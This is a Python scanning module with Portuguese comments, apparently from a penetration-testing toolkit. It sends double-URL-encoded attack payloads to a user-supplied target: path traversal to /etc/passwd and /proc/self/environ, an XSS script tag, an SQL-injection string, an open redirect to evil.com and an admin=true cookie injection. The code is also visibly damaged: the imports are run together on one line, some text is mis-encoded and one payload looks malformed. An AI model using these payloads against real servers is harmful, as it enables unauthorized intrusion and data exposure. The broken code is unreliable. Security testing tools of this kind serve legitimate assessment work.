#!/usr/bin/env python3
"""Modulo de testes de Double URL Encoding Bypass.

Testa se o servidor e vulneravel a bypass de filtros via encoding duplo:
  - Paths com encoding duplo (%2f -> %252f)
  - Parametros GET/POST com encoding duplo
  - Path traversal via encoding duplo
  - Headers com encoding duplo
  - WAF bypass via encoding duplo (XSS, SQLi, redirect)

Fluxo:
  1. Envia requisicao baseline sem encoding
  2. Envia requisicoes com payloads double-encoded
  3. Compara respostas (status, tamanho, headers, corpo)
  4. Classifica cada tecnica: vulnerable, blocked, error
  5. Retorna resultado consolidado com severidade
"""
import argparseimport asyncioimport loggingfrom collections.abc import Awaitablefrom dataclasses import asdict, dataclassfrom urllib.parse import quote, urlparse, urlunparseimport httpxfrom mytools.core.utils import (    Cyber,    add_common_args,    color,    create_async_client,    create_banner,    init_scanner,    print_exploit_info,    run_main_loop,    safe_asyncio_run,    write_output,)logger = logging.getLogger("mytools.doubleurlencode")

_CATEGORY_MAP: dict[str, list[str]] = {
    "url": ["double_path", "double_query", "double_fragment"],
    "param": ["double_get", "double_post", "double_json"],
    "traversal": ["double_dotdot", "double_backslash", "double_mixed"],
    "header": ["double_referer", "double_cookie", "double_ua"],
    "waf": ["double_xss", "double_sqli", "double_redirect"],
}


def _double_encode(payload: str) -> str:
    """Encoda uma vez, depois encoda os % novamente (double encoding)."""
    once = quote(payload, safe="")
    return once.replace("%", "%25")


def _triple_encode(payload: str) -> str:
    """Encoda tres vezes."""
    return _double_encode(quote(payload, safe=""))


_DOUBLE_PAYLOADS: dict[str, str] = {
    "/": "%252f",
    "\\": "%255c",
    "'": "%2527",
    '"': "%2522",
    "<": "%253c",
    ">": "%253e",
    " ": "%2520",
    "&": "%2526",
    "#": "%2523",
    ";": "%253b",
    "\r": "%250d",
    "\n": "%250a",
    "=": "%253d",
}


@dataclass(frozen=True, slots=True)
class DoubleURLEncodeAttempt:
    """Tentativa individual de double URL encoding bypass."""

    technique: str
    category: str
    url: str
    payload: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class DoubleURLEncodeResult:
    """Resultado consolidado do scan de double URL encoding bypass."""

    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[DoubleURLEncodeAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


def _build_double_url(url: str, char: str, double_payload: str, position: str) -> str:
    """ConstrÃ³i URL com payload double-encoded."""
    parsed = urlparse(url)
    if not parsed.scheme:
        parsed = urlparse(f"http://{url}")

    if position == "path":
        path = parsed.path.rstrip("/") + "/" + double_payload
        return urlunparse(parsed._replace(path=path))
    elif position == "query":
        existing = parsed.query
        sep = "&" if existing else ""
        new_query = f"{existing}{sep}test={double_payload}"
        return urlunparse(parsed._replace(query=new_query))
    elif position == "fragment":
        return urlunparse(parsed._replace(fragment=double_payload))
    return url


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""
    try:
        resp = await client.get(url, follow_redirects=False)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


async def _test_double_url(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[DoubleURLEncodeAttempt]:
    """Testa double encoding em URLs."""
    attempts: list[DoubleURLEncodeAttempt] = []
    b_status, b_size, _ = baseline

    for char, double_payload in _DOUBLE_PAYLOADS.items():
        for position in ["path", "query", "fragment"]:
            test_url = _build_double_url(url, char, double_payload, position)
            technique = f"double_url_{position}"

            try:
                resp = await client.get(test_url, follow_redirects=False)
                t_status = resp.status_code
                t_size = len(resp.content)
                status_changed = t_status != b_status
                size_changed = abs(t_size - b_size) > 50
                vulnerable = status_changed and t_status == 200

                attempts.append(DoubleURLEncodeAttempt(
                    technique=technique,
                    category="url",
                    url=test_url,
                    payload=double_payload,
                    status_baseline=b_status,
                    status_test=t_status,
                    size_baseline=b_size,
                    size_test=t_size,
                    status_changed=status_changed,
                    size_changed=size_changed,
                    vulnerable=vulnerable,
                    details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                    error="",
                    exploit="double_encoded_payload" if vulnerable else "",
                    tool="wfuzz",
                ))
            except httpx.RequestError as exc:
                attempts.append(DoubleURLEncodeAttempt(
                    technique=technique,
                    category="url",
                    url=test_url,
                    payload=double_payload,
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(exc),
                ))

    return attempts


async def _test_double_params(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[DoubleURLEncodeAttempt]:
    """Testa double encoding em parametros GET/POST."""
    attempts: list[DoubleURLEncodeAttempt] = []
    b_status, b_size, _ = baseline

    parsed = urlparse(url)
    base_url = urlunparse(parsed._replace(query=""))

    test_payloads = [
        ("double_get", "GET", {"q": f"test{_DOUBLE_PAYLOADS['/']}admin"}),
        ("double_post", "POST", {"field": f"value{_DOUBLE_PAYLOADS['<']}script"}),
        ("double_json", "JSON", {"data": f"payload{_DOUBLE_PAYLOADS['\\']}..%252fetc%252fpasswd"}),
    ]

    for technique, method, data in test_payloads:
        try:
            if method == "GET":
                resp = await client.get(base_url, params=data, follow_redirects=False)
            elif method == "POST":
                resp = await client.post(base_url, data=data, follow_redirects=False)
            else:
                resp = await client.post(
                    base_url, json=data, headers={"Content-Type": "application/json"},
                    follow_redirects=False,
                )

            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(DoubleURLEncodeAttempt(
                technique=technique,
                category="param",
                url=base_url,
                payload=str(data),
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
                exploit="double_encoded_payload" if vulnerable else "",
                tool="wfuzz",
            ))
        except httpx.RequestError as exc:
            attempts.append(DoubleURLEncodeAttempt(
                technique=technique,
                category="param",
                url=base_url,
                payload=str(data),
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_double_traversal(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[DoubleURLEncodeAttempt]:
    """Testa path traversal via double encoding."""
    attempts: list[DoubleURLEncodeAttempt] = []
    b_status, b_size, _ = baseline

    parsed = urlparse(url)
    base_path = parsed.path.rstrip("/")

    traversal_payloads = [
        ("double_dotdot", "..%252f..%252f..%252fetc/passwd"),
        ("double_dotdot", "..%252f..%252fetc/passwd%2500"),
        ("double_backslash", "..%255c..%255c..%255cwindows%255csystem32"),
        ("double_mixed", "%252e%252e%252f"),
        ("double_mixed", "..%c0%af..%c0%afetc/passwd"),
        ("double_mixed", "..%252f..%252fproc%252fself%252fenviron"),
    ]

    for technique, payload in traversal_payloads:
        test_url = urlunparse(parsed._replace(path=f"{base_path}/{payload}"))
        try:
            resp = await client.get(test_url, follow_redirects=False)
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(DoubleURLEncodeAttempt(
                technique=technique,
                category="traversal",
                url=test_url,
                payload=payload,
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
                exploit="double_encoded_payload" if vulnerable else "",
                tool="wfuzz",
            ))
        except httpx.RequestError as exc:
            attempts.append(DoubleURLEncodeAttempt(
                technique=technique,
                category="traversal",
                url=test_url,
                payload=payload,
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_double_headers(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[DoubleURLEncodeAttempt]:
    """Testa double encoding em headers."""
    attempts: list[DoubleURLEncodeAttempt] = []
    b_status, b_size, _ = baseline

    header_payloads = [
        ("double_referer", "Referer", f"https://example.com{_DOUBLE_PAYLOADS['/']}admin"),
        ("double_cookie", "Cookie", f"session=abc{_DOUBLE_PAYLOADS[';']}admin=true"),
        ("double_ua", "User-Agent", f"Mozilla/5.0{_DOUBLE_PAYLOADS['<']}script{_DOUBLE_PAYLOADS['>']}"),
    ]

    for technique, header_name, header_value in header_payloads:
        try:
            resp = await client.get(url, headers={header_name: header_value}, follow_redirects=False)
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(DoubleURLEncodeAttempt(
                technique=technique,
                category="header",
                url=url,
                payload=header_value,
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
                exploit="double_encoded_payload" if vulnerable else "",
                tool="wfuzz",
            ))
        except httpx.RequestError as exc:
            attempts.append(DoubleURLEncodeAttempt(
                technique=technique,
                category="header",
                url=url,
                payload=header_value,
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_double_waf(
    client: httpx.AsyncClient, url: str, baseline: tuple[int, int, bytes]
) -> list[DoubleURLEncodeAttempt]:
    """Testa WAF bypass via double encoding."""
    attempts: list[DoubleURLEncodeAttempt] = []
    b_status, b_size, _ = baseline

    waf_payloads = [
        ("double_xss", f"{_DOUBLE_PAYLOADS['<']}script{_DOUBLE_PAYLOADS['>']}alert(1){_DOUBLE_PAYLOADS['<']}{_DOUBLE_PAYLOADS['/']}script{_DOUBLE_PAYLOADS['>']}"),
        ("double_sqli", f"{_DOUBLE_PAYLOADS['\\']}{_DOUBLE_PAYLOADS['\\']} OR 1{_DOUBLE_PAYLOADS['=']}1{_DOUBLE_PAYLOADS['\\']}{_DOUBLE_PAYLOADS['\\']}"),
        ("double_redirect", f"http:{_DOUBLE_PAYLOADS['/']}{_DOUBLE_PAYLOADS['/']}evil.com"),
    ]

    parsed = urlparse(url)
    base_url = urlunparse(parsed._replace(query=""))

    for technique, payload in waf_payloads:
        try:
            resp = await client.get(base_url, params={"input": payload}, follow_redirects=False)
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = status_changed and t_status == 200

            attempts.append(DoubleURLEncodeAttempt(
                technique=technique,
                category="waf",
                url=base_url,
                payload=payload,
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
                exploit="double_encoded_payload" if vulnerable else "",
                tool="wfuzz",
            ))
        except httpx.RequestError as exc:
            attempts.append(DoubleURLEncodeAttempt(
                technique=technique,
                category="waf",
                url=base_url,
                payload=payload,
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def scan_double_url_encode(
    url: str,
    timeout: float = 10.0,
    user_agent: str | None = None,
    proxy: str | None = None,
    verify: bool = False,
    category: str | None = None,
    concurrency: int = 5,
) -> DoubleURLEncodeResult:
    """Executa scan de double URL encoding bypass contra a URL alvo."""
    parsed = urlparse(url)
    if not parsed.scheme:
        url = f"http://{url}"
        parsed = urlparse(url)

    tls = parsed.scheme == "https"

    async with create_async_client(
        user_agent=user_agent or "MyTools/doubleurlencode",
        proxy=proxy,
        timeout=timeout,
        verify=verify,
    ) as client:
        b_status, b_size, b_body = await _test_baseline(client, url)
        baseline = (b_status, b_size, b_body)

        sem = asyncio.Semaphore(concurrency)

        async def _limited(coro: Awaitable[object]) -> object:
            async with sem:
                return await coro

        tasks: list[Awaitable[object]] = []
        selected = _CATEGORY_MAP.get(category, []) if category else []

        if not category or category == "url":
            tasks.append(_limited(_test_double_url(client, url, baseline)))
        if not category or category == "param":
            tasks.append(_limited(_test_double_params(client, url, baseline)))
        if not category or category == "traversal":
            tasks.append(_limited(_test_double_traversal(client, url, baseline)))
        if not category or category == "header":
            tasks.append(_limited(_test_double_headers(client, url, baseline)))
        if not category or category == "waf":
            tasks.append(_limited(_test_double_waf(client, url, baseline)))

        if category and not selected:
            return DoubleURLEncodeResult(
                target=url,
                baseline_status=b_status,
                baseline_size=b_size,
                tls=tls,
                attempts=[],
                vulnerable_techniques=[],
                blocked_techniques=[],
                issues=[f"Categoria desconhecida: {category}"],
                overall_status="error",
            )

        results = await asyncio.gather(*tasks, return_exceptions=True)
        all_attempts: list[DoubleURLEncodeAttempt] = []
        for r in results:
            if isinstance(r, list):
                all_attempts.extend(r)

    vulnerable: list[str] = []
    blocked: list[str] = []
    issues: list[str] = []

    seen: set[str] = set()
    for att in all_attempts:
        if att.technique not in seen:
            seen.add(att.technique)
            if att.vulnerable:
                vulnerable.append(att.technique)
            elif att.status_changed:
                blocked.append(att.technique)

    if vulnerable:
        issues.append(f"{len(vulnerable)} tecnicas de double encoding vulneraveis")
    if blocked:
        issues.append(f"{len(blocked)} tecnicas bloqueadas pelo servidor")

    overall = "vulnerable" if vulnerable else "blocked" if blocked else "secure"

    return DoubleURLEncodeResult(
        target=url,
        baseline_status=b_status,
        baseline_size=b_size,
        tls=tls,
        attempts=all_attempts,
        vulnerable_techniques=vulnerable,
        blocked_techniques=blocked,
        issues=issues,
        overall_status=overall,
    )


def print_results(result: DoubleURLEncodeResult) -> None:
    """Exibe os resultados do scan formatados."""
    print()
    print(color("=" * 60, Cyber.CYAN))
    print(color("  DOUBLE URL ENCODING BYPASS SCAN", Cyber.CYAN))
    print(color("=" * 60, Cyber.CYAN))
    print(color(f"  Target: {result.target}", Cyber.WHITE))
    print(color(f"  Baseline: {result.baseline_status} ({result.baseline_size} bytes)", Cyber.GRAY))
    print(color(f"  TLS: {'Sim' if result.tls else 'Nao'}", Cyber.GRAY))

    status_color = Cyber.RED if result.overall_status == "vulnerable" else Cyber.GREEN
    print(color(f"\n  Status: {result.overall_status.upper()}", status_color))

    if result.vulnerable_techniques:
        print(color("\n  [VULNERAVEL]", Cyber.RED))
        for tech in result.vulnerable_techniques:
            print(color(f"    - {tech}", Cyber.RED))
            a = next((a for a in result.attempts if a.technique == tech), None)
            if a:
                print_exploit_info(a.exploit, a.tool)

    if result.blocked_techniques:
        print(color("\n  [BLOQUEADO]", Cyber.GREEN))
        for tech in result.blocked_techniques:
            print(color(f"    - {tech}", Cyber.GREEN))

    if result.issues:
        print(color("\n  Observacoes:", Cyber.YELLOW))
        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))

    print(color("=" * 60, Cyber.CYAN))


def build_parser() -> argparse.ArgumentParser:
    """ConstrÃ³i o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-dblurl",
        description="Double URL Encoding Bypass â€” testa bypass de filtros via encoding duplo.",
    )
    add_common_args(parser)
    parser.add_argument("url", nargs="?", help="URL alvo para teste")
    parser.add_argument(
        "-c", "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de teste (url, param, traversal, header, waf)",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=5,
        help="Numero de requisicoes simultaneas (default: 5)",
    )
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan unico e retorna codigo de saida."""
    init_scanner(args)
    url = getattr(args, "url", None) or getattr(args, "target", None)
    if not url:
        logger.error("Especifique uma URL alvo.")
        return 1

    result = safe_asyncio_run(
        scan_double_url_encode(
            url=url,
            timeout=getattr(args, "timeout", 10.0),
            user_agent=getattr(args, "user_agent", None),
            proxy=getattr(args, "proxy", None),
            verify=getattr(args, "verify", False),
            category=getattr(args, "category", None),
            concurrency=getattr(args, "concurrency", 5),
        )
    )
    print_results(result)

    output_path = getattr(args, "output", None)
    if output_path:
        write_output(output_path, asdict(result))
        logger.info("Resultados salvos em: %s", output_path)

    return 0 if result.overall_status != "error" else 1


banner_art = create_banner(
    r"""
     _   _                      _____                              _
    | \ | |                    |  __ \                            | |
    |  \| | _____  ___   _  __| |  | | ___  _ __ _ __ ___   __ _| |_
    | . ` |/ _ \ \/ / | | |/ _` |  | |/ _ \| '__| '_ ` _ \ / _` | __|
    | |\  |  __/>  <| |_| | (_| |  | | (_) | |  | | | | | | (_| | |_
    |_| \_|\___/_/\_\\__,_|\__,_|_|  \___/|_|  |_| |_| |_|\__,_|\__|

    """,
    "Double URL Encoding Bypass â€” detecta bypass de filtros via encoding duplo",
)


def main() -> int:
    """Ponto de entrada principal do CLI."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="dblurl> ",
        description="Double URL Encoding Bypass interativo.",
        example="https://target.com -c url",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c url\n"
            "  https://target.com -c traversal\n"
            "  https://target.com -c waf --proxy http://127.0.0.1:8080"
        ),
    )
